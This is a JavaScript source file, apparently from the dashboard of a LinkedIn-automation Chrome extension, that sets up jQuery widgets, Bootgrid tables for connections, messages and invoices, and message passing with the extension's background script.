"use strict";
/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && $("html").addClass("ismobile"), $(document).ready(function() {
    function a(a, b, c) {
        /*$(a).mCustomScrollbar({
            theme: b,
            scrollInertia: 100,
            axis: "yx",
            mouseWheel: {
                enable: !0,
                axis: c,
                preventDefault: !0
            }
        })*/
    }
    if ($("html").hasClass("ismobile") || $(".c-overflow")[0] && a(".c-overflow", "minimal-dark", "y"), $(".navigation__sub")[0] && $("body").on("click", ".navigation__sub > a", function(a) {
            if($(this).closest('#navigation_min').length != 1){
                a.preventDefault(), $(this).closest(".navigation__sub").toggleClass("navigation__sub--toggled"), $(this).parent().find("ul").stop().slideToggle(250)
            }
        }), $(".top-search")[0] && ($("body").on("focus", ".top-search__input", function() {
            $(".top-search").addClass("top-search--focused")
        }), $("body").on("click", ".top-menu__trigger > a", function(a) {
            a.preventDefault(), $(".top-search").addClass("top-search--focused"), $(".top-search__input").focus()
        }), $("body").on("click", ".top-search__reset", function() {
            $(".top-search").removeClass("top-search--focused "), $(".top-search__input").val("")
        }), $("body").on("blur", ".top-search__input", function() {
            var a = $(this).val();
            !a.length > 0 && $(".top-search").removeClass("top-search--focused")
        })), $("body").on("click", '[data-mae-target="#notifications"]', function(a) {
            a.preventDefault();
            var b = $(this).data("target");
            $("a[href=" + b + "]").tab("show")
        }), $("#widget-weather__main")[0]) {
    }
    if ($(".form-group--float")[0] && ($(".form-group--float").each(function() {
            var a = $(this).find(".form-control").val();
            0 == !a.length && $(this).addClass("form-group--active")
        }), $("body").on("blur", ".form-group--float .form-control", function() {
            var a = $(this).val(),
                b = $(this).parent();
            0 == a.length ? b.removeClass("form-group--active") : b.addClass("form-group--active")
        })), $(".collapse")[0] && ($(".collapse").on("show.bs.collapse", function(a) {
            $(this).closest(".panel").find(".panel-heading").addClass("active")
        }), $(".collapse").on("hide.bs.collapse", function(a) {
            $(this).closest(".panel").find(".panel-heading").removeClass("active")
        }), $(".collapse.in").each(function() {
            $(this).closest(".panel").find(".panel-heading").addClass("active")
        })), $(".login")[0] && $("body").on("click", ".login__block [data-block]", function(a) {
            a.preventDefault();
            var b = $(this).data("block"),
                c = $(this).closest(".login__block"),
                d = $(this).data("bg");
            c.removeClass("toggled"), setTimeout(function() {
                $(".login").attr("data-lbg", d), $(b).addClass("toggled")
            })
        }), $(".action-header__search")[0]) {
        var c;
        $("body").on("click", ".action-header__toggle", function(a) {
            a.preventDefault(), c = $(this).closest(".action-header").find(".action-header__search"), c.fadeIn(300), c.find(".action-header__input").focus()
        }), $("body").on("click", ".action-header__close", function() {
            c.fadeOut(300), setTimeout(function() {
                c.find(".action-header__input").val("")
            }, 350)
        })
    }
    $("input-mask")[0] && $(".input-mask").mask(), $(".color-picker")[0] && $(".color-picker").each(function() {
        var a = $(this).find(".color-picker__value"),
            b = $(this).find(".color-picker__target");
        b.farbtastic(a)
    }), $(".date-time-picker")[0] && $(".date-time-picker").datetimepicker({
        icons: {
            time: "zmdi zmdi-time",
            date: "zmdi zmdi-calendar",
            up: "zmdi zmdi-chevron-up",
            down: "zmdi zmdi-chevron-down",
            previous: "zmdi zmdi-chevron-left",
            next: "zmdi zmdi-chevron-right",
            today: "zmdi zmdi-screenshot",
            clear: "zmdi zmdi-trash",
            close: "zmdi zmdi-times"
        }
    }), $(".time-picker")[0] && $(".time-picker").datetimepicker({
        format: "LT",
        icons: {
            time: "zmdi zmdi-time",
            date: "zmdi zmdi-calendar",
            up: "zmdi zmdi-chevron-up",
            down: "zmdi zmdi-chevron-down",
            previous: "zmdi zmdi-chevron-left",
            next: "zmdi zmdi-chevron-right",
            today: "zmdi zmdi-screenshot",
            clear: "zmdi zmdi-trash",
            close: "zmdi zmdi-times"
        }
    }), $(".date-picker")[0] && $(".date-picker").datetimepicker({
        format: "DD/MM/YYYY",
        icons: {
            time: "zmdi zmdi-time",
            date: "zmdi zmdi-calendar",
            up: "zmdi zmdi-chevron-up",
            down: "zmdi zmdi-chevron-down",
            previous: "zmdi zmdi-chevron-left",
            next: "zmdi zmdi-chevron-right",
            today: "zmdi zmdi-screenshot",
            clear: "zmdi zmdi-trash",
            close: "zmdi zmdi-times"
        }
    }), $(".datetime-picker-inline")[0] && $(".datetime-picker-inline").datetimepicker({
        inline: !0,
        sideBySide: !0,
        icons: {
            time: "zmdi zmdi-time",
            date: "zmdi zmdi-calendar",
            up: "zmdi zmdi-chevron-up",
            down: "zmdi zmdi-chevron-down",
            previous: "zmdi zmdi-chevron-left",
            next: "zmdi zmdi-chevron-right",
            today: "zmdi zmdi-screenshot",
            clear: "zmdi zmdi-trash",
            close: "zmdi zmdi-times"
        }
    }), $(".tab-wizard")[0] && $(".tab-wizard").bootstrapWizard({
        tabClass: "tab-wizard__nav",
        nextSelector: ".tab-wizard__next",
        previousSelector: ".tab-wizard__previous",
        firstSelector: ".tab-wizard__first",
        lastSelector: ".tab-wizard__last"
    }), $(".lightbox")[0] && $(".lightbox").lightGallery({
        enableTouch: !0
    }), $('[data-toggle="tooltip"]')[0] && $('[data-toggle="tooltip"]').tooltip(), $('[data-toggle="popover"]')[0] && $('[data-toggle="popover"]').popover(), $("html").hasClass("ie9") && $("input, textarea").placeholder({
        customClass: "ie9-placeholder"
    }), $("select.select2")[0] && $("select.select2").select2({
        dropdownAutoWidth: !0,
        width: "100%"
    }), $(".textarea-autosize")[0] && autosize($(".textarea-autosize"))
}), $(document).ready(function() {
    function a(a) {
        a.requestFullscreen ? a.requestFullscreen() : a.mozRequestFullScreen ? a.mozRequestFullScreen() : a.webkitRequestFullscreen ? a.webkitRequestFullscreen() : a.msRequestFullscreen && a.msRequestFullscreen()
    }
    var b, c = $("body");
    $(this);
    c.on("click", "[data-mae-action]", function(d) {
        d.preventDefault();
        var e = $(this).data("mae-action");
        switch (e) {
            case "block-open":
                b = $(this).data("mae-target"), $(b).addClass("toggled"), c.addClass("block-opened"), c.append('<div data-mae-action="block-close" data-mae-target="' + b + '" class="mae-backdrop mae-backdrop--sidebar" />');
                break;
            case "block-close":
                $(b).removeClass("toggled"), c.removeClass("block-opened"), $(".mae-backdrop--sidebar").remove();
                break;
            case "fullscreen":
                a(document.documentElement);
                break;
            case "print":
                window.print();
                break;
            case "clear-localstorage":
                swal({
                    title: "Are you sure?",
                    text: "This can not be undone!",
                    type: "warning",
                    showCancelButton: !0,
                    confirmButtonColor: "#3085d6",
                    confirmButtonText: "Yes, clear it",
                    cancelButtonText: "No, cancel"
                }).then(function() {
                    localStorage.clear(), swal("Cleared!", "Local storage has been successfully cleared", "success")
                })
        }
    })
    $("#collapse_menu").bind("click", function() {
        // updatePageLayout();
        $("#collapse_menu").toggleClass("collapsed-menu");
        //Toggle Icon
        $(".logo-container").toggleClass("hidden");
        $(".logo-container-mini").toggleClass("hidden");
        // Change Side Navigation
        $(".navigation-expand").toggleClass("hidden show");
        $(".navigation-collapsed").toggleClass("hidden");
        // Change menu layout
        $("#main").toggleClass("main-collapsed");
    })
    //Prevent unexpected collapsing of side menu due to background elements
    $(".navigation-collapsed .navigation-content .menu-list>li").hover(function(e) {
        $(".main-container").addClass("no-action");
        $("#navigation_min .navigation-content").addClass("navigation-expand-menu");
    }, function(e) {
        $(".main-container").removeClass("no-action");
        $("#navigation_min .navigation-content").removeClass("navigation-expand-menu");
    });
    // Disabling Click events for collapsed menu
    $(".navigation_min navigation-content  ul>li a").unbind('click');
    // setTimeout(function() {
    //     hidePageLoader(document.getElementById("page-loader"));
    //     initBootGrid();
    // }, 2000);
    updatePageLayout();
    chrome.runtime.onConnect.addListener(function(port){
        port.onMessage.addListener(function(msg) {
            var selectedRows = $("body .temp-selectedRows").data('selectedRows');
            $("#msg_notification, #message_notification").remove();
            if (msg.showMsgCount){
                notify({
                    title : 'Message status : Sent',
                    message : 'Number of messages sent : '+msg.count+'/'+selectedRows.length,
                    sendMessages: true,
                    type : 'success'
                });
                chrome.runtime.sendMessage({
                    removeBadge: true
                });
            } else if(msg.wait && msg.time > 0){
                var $div = $('<div />',{id:'msg_notification'});
                $div.append($('<span />').text('Message status : Sending in '+msg.time+' secs'));
                $div.append($('<br />'));
                $div.append($('<span />').text('Number of messages sent : '+msg.count+'/'+selectedRows.length));
                $("body").append($div);
            }
            if(msg.getMessageEntityUrn && typeof postMessageCallback == 'function'){
                postMessageCallback(msg);
            }
            $(".temp-selectedRows").remove();
        });
        globalPort = port;
    })
});

var pageLoader = document.getElementById("page-loader");
var ajaxLoader = document.getElementById("ajax-loader");
var LINKEDIN_HOME_PAGE = 'https://linkedin.com/';
var logout_msg_shown = false;
var PAYMENTURL = 'https://meetleonard.com/payment/';
var globalPort = false;
var postMessageCallback = false;
function hidePageLoader() {
    var b = 1;
    var c = setInterval(function() {
      if (b <= 0.1) {
        clearInterval(c);
        pageLoader.style.display = "none";
      }
      pageLoader.style.opacity = b;
      pageLoader.style.filter = "alpha(opacity=" + 100 * b + ")";
      b -= 0.1 * b;
    }, 10);
    stopHinting();
}
function showPageLoader() {
    var b = 1;
    var c = setInterval(function() {
      if (b >= 0.9) {
        clearInterval(c);
        pageLoader.style.display = "block";
      }
      pageLoader.style.opacity = b;
      pageLoader.style.filter = "alpha(opacity=" + 100 * b + ")";
      b += 0.1 * b;
    }, 10);
    startHinting();
}
function hideAjaxLoader() {
    var b = 1;
    var c = setInterval(function() {
      if (b <= 0.1) {
        clearInterval(c);
        ajaxLoader.style.display = "none";
      }
      ajaxLoader.style.opacity = b;
      ajaxLoader.style.filter = "alpha(opacity=" + 100 * b + ")";
      b -= 0.1 * b;
    }, 10);
}
function showAjaxLoader() {
    var b = 1;
    var c = setInterval(function() {
      if (b >= 0.9) {
        clearInterval(c);
        ajaxLoader.style.display = "block";
      }
      ajaxLoader.style.opacity = b;
      ajaxLoader.style.filter = "alpha(opacity=" + 100 * b + ")";
      b += 0.1 * b;
    }, 10);
}

function enablePort(callback){
    chrome.runtime.sendMessage({
        createPort: true
    }, function(){
        if(typeof callback == 'function') callback();
    })
}

function initBootGrid(isAddButton, isSelectAllEnabled, options){
    var grid = $("#data-table").bootgrid({
        caseSensitive : false,
        addNew : isAddButton,
        rowCount: [10, 25, 50, 100, 250, 500],
        reloadBtn: options.reloadClicked ? true : false,
        addClicked : function(){
            if(options && typeof options.clickHandler == 'function'){
                options.clickHandler();
            }
        },
        //Override default icon classes
        css: {
            icon: 'table-bootgrid__icon zmdi mdi',
            iconSearch: 'mdi-magnify',
            iconColumns: 'zmdi-view-column',
            iconDown: 'mdi-chevron-down',
            iconRefresh: 'zmdi-refresh',
            iconUp: 'mdi-chevron-up',
            dropDownMenu: 'dropdown form-group--select',
            search: 'table-bootgrid__search',
            actions: 'table-bootgrid__actions',
            header: 'table-bootgrid__header text-center',
            footer: 'table-bootgrid__footer',
            dropDownItem: 'table-bootgrid__label',
            table: 'table table-bootgrid',
            pagination: 'pagination table-bootgrid__pagination',
            link : 'zmdi zmdi-eye',
            isAddButton : isAddButton ? 'add_btn_inc' : '',
            reloadBtn : 'mdi mdi-mdi-cached'
        },

        //Override default module markups
        templates: {
            actionDropDown: "<span class=\"{{css.dropDownMenu}}\">" + "<a href='javascript:void(0)' data-toggle=\"dropdown\" class=\"dropdown-text\">{{ctx.content}}</a><ul class=\"{{css.dropDownMenuItems}}\" role=\"menu\"></ul></span>",
            addButton : "<button class=\"btn leo-btn leo-btn-primary header_add_btn\" type=\"button\" title=\"Add\" data-toggle=\"modal\" href=\"#modal--default\">ADD</button>",
            search: "<div class=\"{{css.search}} form-group {{css.isAddButton}}\"><span class=\"{{css.icon}} {{css.iconSearch}}\"></span><input type=\"text\" class=\"{{css.searchField}}\" placeholder=\"{{lbl.search}}\" /><i class='form-group__bar'></i></div>",
            header: "<div id=\"{{ctx.id}}\" class=\"{{css.header}}\"><p class=\"{{css.search}}\"></p><p class=\"{{css.actions}}\"></p></div>",
            actionDropDownCheckboxItem: "<li><div class='tabe-bootgrid__checkbox checkbox checkbox--dark'><label class=\"{{css.dropDownItem}}\"><input name=\"{{ctx.name}}\" type=\"checkbox\" value=\"1\" class=\"{{css.dropDownItemCheckbox}}\" {{ctx.checked}} /> {{ctx.label}}<i class='input-helper'></i></label></div></li>",
            footer: "<div id=\"{{ctx.id}}\" class=\"{{css.footer}}\"><div class=\"row\"><div class=\"col-sm-5\"><p class=\"{{css.pagination}}\"></p></div><div class=\"col-sm-7 table-bootgrid__showing hidden-xs\"><p class=\"{{css.infos}}\"></p></div></div></div>",
            select: "<div class='checkbox'><label><input name=\"select\" type=\"{{ctx.type}}\" class=\"{{css.selectBox}}\" value=\"{{ctx.value}}\" {{ctx.checked}} /><i class='input-helper'></i></label></div>",
            reloadBtn: "<button class=\"btn leo-btn leo-btn-primary \" type=\"button\" title=\"Reload\">REFRESH</button>"
        },
        formatters: {
            "link": function(column, row){
                return "<a href=\"https://www.linkedin.com/in/" + row.id + "/\" target=\"_blank\"><i class=\"zmdi zmdi-eye\"></i></a>";
            },
            "message": function(column, row){
                return "<a href=\"#/\" class=\"message_icon\" data-row-id=\"" + row.id + "\"><i class=\"zmdi zmdi-email\"></i></a>";
            },
            "nameWithLink" : function(col, row){
                return "<a class=\"base-text\" href=\"" + row.url + "\" target=\"_blank\">" + row.name + "</a>";
            },
            "pict" : function(col, row){
                return "<a href='"+row.url+"' class='profile_pic' target='_blank'><img src='"+row.pict+"' width='100%' /></a>";
            },
            "editButton" : function(col, row){
                var title = escape(row.title);
                var message = escape(row.message);
                return "<button class=\"btn leo-btn leo-btn-default edit-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-pencil\"></i> EDIT </button>";
            },
            "viewButton" : function(col, row){
                var title = escape(row.title);
                var message = escape(row.message);
                return "<button class=\"btn leo-btn leo-btn-default view-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.profile_id + "\"> <i class=\"mdi mdi-message-text\"></i> View Conversation </button>";
            },
            "withdrawButton" : function(col, row){
                return "<button class=\"btn leo-btn leo-btn-danger btn-md delete-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-undo-variant\"></i> WITHDRAW </button>";
            },
            "ignoreButton" : function(col, row){
                return "<button class=\"btn leo-btn leo-btn-danger btn-md delete-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.id + "\"> IGNORE </button>";
            },
            "acceptButton" : function(col, row){
                return "<button class=\"btn leo-btn leo-btn-success btn-md accept-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.id + "\"> ACCEPT </button>";
            },
            "deleteButton" : function(col, row){
                return "<button class=\"btn leo-btn leo-btn-danger btn-md delete-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-lg mdi-delete\"></i> DELETE </button>";
            },
            "deleteProfile" : function(col, row){
                return "<button class=\"btn leo-btn leo-btn-danger btn-md delete-item\" data-toggle=\"modal\" href=\"#modal--default\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-lg mdi-delete\"></i> Delete </button>";
            },
            "leonardID" : function(col, row){
                return row.tenant_id == "" ? "<button class=\"btn leo-btn leo-btn-success btn-md assign-item\" data-toggle=\"modal\" href=\"#modal--assign\" type=\"button\" data-row-id=\"" + row.id + "\"> Assign </button>" : row.tenant_id;
            },
            "notAvailableFN" : function(col, row){
                return row.firstName == "" ? "N/A" : row.firstName;
            },
            "notAvailableLU" : function(col, row){
                return row.profile_url == "" ? "N/A" : "<a class=\"base-text\" href=\"" + row.profile_url + "\" target=\"_blank\">" + row.profile_url + "</a>";
            },
            "renewalDate" : function(col, row){
                var renewal_date = parseInt(row.renewal_date.toString() + "000");
                return "<span title='"+new Date(renewal_date).toDateString()+"' datetime='"+new Date(renewal_date).toISOString()+"'>"+timeago().format(new Date(renewal_date))+"</span>";
            },
            "sendButton" : function(col, row){
                var disabled = '';
                var title = '';
                if(!user_details.autoFollowUp || user_details.autoFollowUp != 'false'){
                    disabled = 'disabled';
                    title = "data-toggle='tooltip' data-placement='bottom' data-original-title='You cannot send follow up message manually when auto follow up is enabled'";
                }
                return "<button class=\"btn leo-btn leo-btn-primary btn-md send-item "+disabled+"\" type=\"button\" "+title+" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-send\"></i> SEND </button>";
            },
            "nameAndLink" : function(col, row){
                return "<span class=\"pull-left col-md-9 no-padding\">"+row.name+"</span><a href=\""+row.url+"\" class=\" leo-btn leo-btn-primary pull-right show_on_hover col-md-3\" target=\"_blank\"> VIEW </a>";
            },
            "folMessage" : function(col, row){
                return "<span data-toggle=\"tooltip\" data-placement=\"bottom\" data-original-title=\""+escape(row.follow_up_message)+"\">"+row.follow_up_message.slice(0,50)+"</span>";
            },
            "replyMessage" : function(col, row){
                var HTML = '<select>';
                var rm = row.reply_message;
                if(typeof(rm) == 'string' && rm.length > 0){
                    rm = JSON.parse(rm);
                }
                for(var r=0;r<rm.length;r++){
                    HTML += '<option value="'+rm[r].id+'">'+rm[r].template_name+'</option>';
                }
                HTML += '</select>';
                return HTML;
            },
            "tempContent" : function(col, row){
                return "<span data-toggle=\"tooltip\" data-placement=\"bottom\" data-original-title=\""+escape(row.template_content)+"\">"+row.template_content+"</span>";
            },
            "invMessage" : function(col, row){
                return "<span data-toggle=\"tooltip\" data-placement=\"bottom\" data-original-title=\""+escape(row.invitation_message)+"\">"+row.invitation_message.slice(0,50)+"</span>";
            },
            "date" : function(col, row){
                return "<span datetime='"+new Date(row.date_conn_sent).toISOString()+"'>"+timeago().format(new Date(row.date_conn_sent))+"</span>";
            },
            "dateSent" : function(col, row){
                return "<span datetime='"+new Date(row.date_sent).toISOString()+"'>"+timeago().format(new Date(row.date_sent))+"</span>";
            },
            "dateCreatedAt" : function(col, row){
                return "<span datetime='"+new Date(parseInt(row.createdAt)).toISOString()+"'>"+timeago().format(new Date(parseInt(row.createdAt)))+"</span>";
            },
            "time" : function(col, row){
                return "<span datetime='"+new Date(parseInt(row.time)).toISOString()+"'>"+timeago().format(new Date(parseInt(row.time)))+"</span>";
            },
            "dateSaved" : function(col, row){
                return "<span datetime='"+new Date(row.dateSaved).toISOString()+"'>"+timeago().format(new Date(row.dateSaved))+"</span>";
            },
            "downloadData": function(col, row){
                return "<button class=\"btn leo-btn leo-btn-success btn-md download-local-item\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-lg mdi-download\"></i> DOWNLOAD </button>";
            },
            "renameFile": function(col, row){
                return "<button class=\"btn leo-btn leo-btn-default btn-md rename-local-item\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-lg mdi-pencil\"></i> RENAME </button>";
            },
            "dateInvoice" : function(col, row){
                var date = parseInt(row.payment_date);
                var d = (new Date(date)).toDateString().split(" ").slice(1);
                var data_str = d[0] + " " + d[1] + ", " + d[2];
                return "<span datetime='"+new Date(date).toISOString()+"'>"+data_str+"</span>";
            },
            "downloadLink" : function(col, row){
                return "<button class=\"btn leo-btn leo-btn-success btn-md download-item\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-lg mdi-download\"></i> DOWNLOAD </button>";
            },
            "tagName" : function(col, row){
                var tagHtml = '<span>'+row.name+'</span>';
                if(row.linked_tag_id){
                    tagHtml += '<img src="'+chrome.runtime.getURL('images/in.ico')+'" class="ln_icon" title="Synced from Sales Navigator" />';
                }
                return tagHtml;
            },
            "tag" : function(col, row){
                if(row.tags){
                    // return row.tags.split(',').map(function(t){
                    //     return '<div class="profile_tag"><span>'+t+'</span><i class=\"mdi mdi-delete\"></i></div>';
                    // }).join('');
                    return "<button class=\"btn leo-btn leo-btn-default edit-tag\" data-toggle=\"modal\" href=\"#edit--tag\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-pencil\"></i> <span class=\"tags-label\">" + row.tags + "</span></button>";
                } else {
                    return "<button class=\"btn leo-btn leo-btn-default edit-tag\" data-toggle=\"modal\" href=\"#edit--tag\" type=\"button\" data-row-id=\"" + row.id + "\"> <i class=\"mdi mdi-pencil\"></i> ADD </button>";
                }
            },
            "hasAttachment" : function(col, row){
                var attachments = [];
                try{
                    attachments = JSON.parse(row.attachments);
                } catch(err) {
                    
                }
                var names = attachments.map(x=>x.name).join(", ");
                return attachments.length > 0 ? '<i title="'+names+'" class="zmdi zmdi-attachment"></i>' : '';
            }
        },
        reloadClicked : function(){
            if(typeof options.reloadClicked == 'function'){
                showAjaxLoader();
                disableRefreshIcon();
                options.reloadClicked();
            }
        },
        columnSelection : false,
        selection: isSelectAllEnabled,
        multiSelect: isSelectAllEnabled,
        // rowSelect: isSelectAllEnabled,
        keepSelection: isSelectAllEnabled
    });
    grid.on('loaded.rs.jquery.bootgrid', function(e){
        grid.find(".edit-item").on("click", function(e){
            if(options && typeof options.editRecord == 'function'){
                options.editRecord($(this).data("row-id"));
            }
        });
        grid.find(".view-item").on("click", function(e){
            if(options && typeof options.editRecord == 'function'){
                options.viewRecord($(this).data("row-id"));
            }
        });
        grid.find(".edit-tag").on("click", function(e){
            if(options && typeof options.editTag == 'function'){
                options.editTag($(this).data("row-id"));
            }
        });
        grid.find(".delete-item").on("click", function(e){
            if(options && typeof options.deleteRecord == 'function'){
                options.deleteRecord($(this).data("row-id"));
            }
        });
        grid.find(".accept-item").on("click", function(e){
            if(options && typeof options.acceptRecord == 'function'){
                options.acceptRecord($(this).data("row-id"));
            }
        });
        grid.find(".download-item").on("click", function(e){
            // window.open(site_url+'download_receipt?receipt_id='+$(this).data("row-id"), '_blank');
            window.open($(this).data("row-id"));
            return false;
        });
        grid.find(".download-local-item").on("click", function(e){
            if(options && typeof options.downloadClicked == 'function'){
                options.downloadClicked($(this).data("row-id"));
            }
            return false;
        });
        grid.find(".rename-local-item").on("click", function(e){
            if(options && typeof options.renameClicked == 'function'){
                options.renameClicked($(this).data("row-id"));
            }
            return false;
        });
        grid.find(".send-item").on("click", function(e){
            if(options && !$(this).hasClass("disabled") && typeof options.sendMessage == 'function'){
                options.sendMessage($(this).data("row-id"));
            } else {
                e.preventDefault();
                return false;
            }
        });
        if($('[data-toggle="tooltip"]').length > 0){
            $('[data-toggle="tooltip"]').tooltip()
        }
        var isSelected = grid.data('.rs.jquery.bootgrid').selectedRows.length == 0 ? 'disabled' : '';
        if(grid.find(".send-item").length > 0 || options.sendAll){
            var btnClass = '';
            if(options.sendAllText == 'Send All'){
                isSelected = '';
                btnClass = '';
            } else {
                btnClass = 'row-selected';
                $(".show-selected").remove();
                var gridData = grid.data('.rs.jquery.bootgrid');
                var onlySelected = 'Show selected';
                if(gridData.onlySelected){
                    onlySelected = 'Show All';
                }
                var $button = $('<button class="btn leo-btn leo-btn-primary '+btnClass+' show-selected margin-right-20" '+isSelected+'>'+onlySelected+'</button>');
                $(".infos").before($button);
                $(".show-selected").on("click", function(e){
                    if(gridData && typeof gridData.showSelected == 'function'){
                        gridData.showSelected();
                    }
                });
            }
            var send_all_disabled = '';
            var send_all_tooltip = '';
            if(options.sendAllText == 'Send All' && (!user_details.autoFollowUp || user_details.autoFollowUp != 'false')){
                send_all_disabled = 'disabled';
                send_all_tooltip = "data-toggle='tooltip' data-placement='bottom' data-original-title='You cannot send follow up message manually when auto follow up is enabled'";
            }
            if(options.sendAllText){
                $(".send-all-items").remove();
                var $button = $('<button class="btn leo-btn leo-btn-primary '+btnClass+' send-all-items '+send_all_disabled+' margin-right-20" '+isSelected+' '+send_all_tooltip+'>'+options.sendAllText+'</button>');
                $(".infos").before($button);
                $(".send-all-items").on("click", function(e){
                    if(user_details.user_type == 'Free' || user_details.user_type == 'Personal'){
                        showNotification("Feature not available on Free Plan.\nClick here to upgrade.", 'payment');
                        return false;
                    }
                    if(options && !$(this).hasClass("disabled") && typeof options.sendAll == 'function'){
                        options.sendAll();
                    }
                });
            }
            if(options.addTagsToUsers){
                $(".add-tags-to-users").remove();
                var $button = $('<button class="btn leo-btn leo-btn-primary '+btnClass+' add-tags-to-users margin-right-20" '+isSelected+'>Add Tags to Selected</button>');
                $(".infos").before($button);
                $(".add-tags-to-users").on("click", function(e){
                    if(options && typeof options.addTagsBtnClicked == 'function'){
                        options.addTagsBtnClicked();
                    }
                });
            }
        }
        if(grid.find(".accept-all-item").length > 0 || options.acceptAll){
            $(".send-all-items").remove();
            var $button = $('<button class="btn leo-btn leo-btn-success '+btnClass+' accept-all-items margin-right-20"> Accept All </button>');
            $(".infos").before($button);
            $(".accept-all-items").on("click", function(e){
                if(user_details.user_type == 'Free' || user_details.user_type == 'Personal' || user_details.user_type == 'Standard'){
                    showNotification("Feature not available on Free Plan.\nClick here to upgrade.", 'payment');
                    return false;
                }
                if(options && !$(this).hasClass("disabled") && typeof options.acceptAll == 'function'){
                    options.acceptAll();
                }
            });
        }
        isSelected = grid.data('.rs.jquery.bootgrid').selectedRows.length == 0 ? 'disabled' : '';
        if(options.addTagsToAcceptedUsers){
            $(".add-tags-to-users").remove();
            var $button = $('<button class="btn leo-btn leo-btn-primary '+btnClass+' row-selected add-tags-to-users margin-right-20" '+isSelected+'>Add Tags to Selected</button>');
            $(".infos").before($button);
            $(".add-tags-to-users").on("click", function(e){
                if(options && typeof options.addTagsBtnClicked == 'function'){
                    options.addTagsBtnClicked();
                }
            });
        }
        if(options.deleteSelected){
            $(".delete-accepted-connection-requests").remove();
            var delBtnTxt = 'Delete selected';
            if(options.deleteBtnTxt == 'WITHDRAW'){
                delBtnTxt = 'Withdraw selected';
            }
            if(options.deleteBtnTxt == 'IGNORE'){
                delBtnTxt = 'Ignore selected';
            }
            var $button = $('<button class="btn leo-btn leo-btn-danger row-selected delete-accepted-connection-requests margin-right-20" '+isSelected+'>'+delBtnTxt+'</button>');
            $(".infos").before($button);
            $(".delete-accepted-connection-requests").on("click", function(e){
                if(options && typeof options.deleteSelectedClicked == 'function'){
                    options.deleteSelectedClicked(grid.data('.rs.jquery.bootgrid').selectedRows);
                }
            });
        }
        if(grid.find(".message_icon").length > 0){
            $(".message_icon").unbind("click");
            $(".message_icon").bind("click", function(){
                var grid = $("#data-table").data('.rs.jquery.bootgrid');
                var selected_row_id = $(this).data("row-id");
                grid.select([selected_row_id]);
                $(".send-all-items").click();
            })
        }
        if(options.sendFollowUpMessagesToSelected){
            var send_all_disabled = '';
            var send_all_tooltip = '';
            if(!user_details.autoFollowUp || user_details.autoFollowUp != 'false'){
                send_all_disabled = 'disabled';
                send_all_tooltip = "data-toggle='tooltip' data-placement='bottom' data-original-title='You cannot send follow up message manually when auto follow up is enabled'";
            }
            $(".send-follow-up-to-selected").remove();
            var $button = $('<button class="btn leo-btn leo-btn-primary row-selected send-follow-up-to-selected '+send_all_disabled+' margin-right-20" '+isSelected+' '+send_all_tooltip+'> Send Selected </button>');
            $(".infos").before($button);
            $(".send-follow-up-to-selected").on("click", function(e){
                if(options && !$(this).hasClass("disabled") && typeof options.sendFollowUpMessagesToSelected == 'function'){
                    options.sendFollowUpMessagesToSelected(grid.data('.rs.jquery.bootgrid').selectedRows);
                }
            });
        }
        if(options.addProfile){
            $(".add-profile").remove();
            var $button = $('<button class="btn leo-btn leo-btn-danger '+btnClass+' add-profile margin-right-20">Add Profile(s)</button>');
            $(".infos").before($button);
            $(".add-profile").on("click", function(e){
                if(options && typeof options.addProfile == 'function'){
                    options.addProfile();
                }
            });
        }
        if(options.assignProfile){
            $(".assign-item").on("click", function(e){
                var selected_row_id = $(this).data("row-id");
                if(options && typeof options.assignProfile == 'function'){
                    options.assignProfile(selected_row_id);
                }
            });
        }
        $("td").each(function(){
            if($(this).find("[data-toggle='tooltip']").length == 0){
                $(this).attr("title",$(this).text());
            }
        })
        $('[data-toggle="tooltip"]').tooltip();
        hidePageLoader();
    });
    grid.on('selected.rs.jquery.bootgrid deselected.rs.jquery.bootgrid', function(e){
        if(typeof options.selectionChange == 'function'){
            options.selectionChange();
        }
    });
}

function getProfileDetails(callback){
    $(".upgrade_btn").unbind("click");
    $(".upgrade_btn").bind("click", function(){
        chrome.tabs.create({url: PAYMENTURL});
    })
    chrome.runtime.sendMessage({getLatestData:true},function(ud){
        user_details = ud;
        if(typeof user_details.autoWish == 'string' && user_details.autoWish.length > 0){
            try{
                user_details.autoWish = JSON.parse(user_details.autoWish);
            } catch(err){
                user_details.autoWish = {anniversary: null,birthday: null,endorsement:null,jobchange:null};
            }
        }
        $(".plan_details").text(user_details.user_type);
        if(user_details.user_type != "Basic")
            $(".upgrade_btn").hide();
        if(typeof callback == 'function'){
            callback();
        }
    })
    // chrome.storage.local.get('user_details',function(ud){
    //     user_details = ud['user_details'];
    //     if(typeof callback == 'function'){
    //         callback();
    //     }
    // })
}

function getConnectionsSent(callback){
    chrome.runtime.sendMessage({'getUserSentConnections':true}, function(sc){
        callback(sc['conns']);
    })
}

function addTagsToConnections(vals, conns, idx, callback){
    var conn_id = conns[idx];
    if(conn_id){
        addTagsToConnection(vals, conn_id, function(){
            idx++;
            addTagsToConnections(vals, conns, idx, callback);
        })
    } else if(typeof callback == 'function'){
        callback();
    }
}

function removeConnectionInvitations_old(conn_ids, idx, callback, is_pending){
    if(conn_ids[idx]){
        var conn_id = conn_ids[idx];
        withdrawConnection(conn_id.c_public_id, is_pending, function(){
            $.ajax({
                method: 'POST',
                url: site_url + 'remove_connection',
                data: {
                    connection_id: conn_id.id
                },
                success: function() {
                    idx++;
                    removeConnectionInvitations(conn_ids, idx, callback, is_pending);
                }
            })
        })
    } else if(typeof callback == 'function'){
        callback();
    }
}

